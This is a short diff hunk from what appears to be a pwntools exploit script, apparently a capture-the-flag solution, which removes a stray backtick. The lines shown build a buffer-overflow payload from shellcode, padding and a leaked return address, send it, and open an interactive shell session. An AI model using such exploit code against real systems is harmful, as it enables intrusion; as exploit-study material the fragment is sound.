@@ -20,4 +20,4 @@ leak_ret = int(leak_ret, 16)
 payload = shellcode+"A"*(pad-len(shellcode))+p32(leak_ret)
 
 p.send(payload)
-p.interactive()`
+p.interactive()
